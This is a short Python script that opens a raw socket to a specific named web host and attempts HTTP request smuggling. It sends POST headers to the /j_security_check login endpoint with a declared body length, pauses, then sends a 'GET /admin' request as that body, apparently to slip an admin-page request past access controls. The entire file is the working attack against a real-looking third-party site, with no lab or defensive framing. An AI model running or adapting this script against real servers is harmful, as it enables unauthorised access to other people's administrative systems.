import socket
import time

host = "adself.misritaliaproperties.com"
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Send POST headers only
request = b"""POST /j_security_check HTTP/1.1\r
Host: adself.misritaliaproperties.com\r
Content-Length: 331\r
Content-Type: application/x-www-form-urlencoded\r
Connection: keep-alive\r
\r
"""

s.send(request)
time.sleep(10)  # simulate body delay

# Send a second request inside the POST body
payload = b"""GET /admin HTTP/1.1\r
Host: adself.misritaliaproperties.com\r
\r
"""

s.send(payload)

# Read the server response
print(s.recv(4096).decode())
s.close()
